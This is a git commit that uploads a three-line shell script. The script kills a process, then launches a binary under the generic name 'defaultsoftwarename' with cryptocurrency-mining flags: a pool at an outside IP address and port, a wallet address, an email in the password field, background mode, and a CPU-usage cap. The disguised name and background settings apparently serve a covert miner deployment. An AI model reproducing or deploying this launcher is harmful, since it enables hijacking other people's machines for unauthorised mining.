c28e2dec7101e612c809b63248dfb4fea88e9946
googlo43 <67450138+googlo43@users.noreply.github.com>
2020-06-27 08:34:38 +0300

    Add files via upload

---
+++ 1.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 194.87.96.23:27598 -u 88PeDs2PnkAAMmZnZo8WbpKAvpAJ3rfDLW8UTA6t7jUXetfYJytw9dYi6gZrajp7DSbJLuXgUPuTcVRrYuDbRsruL1UqiGh --pass=x:reskomore@yandex.com --rig-id=04 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
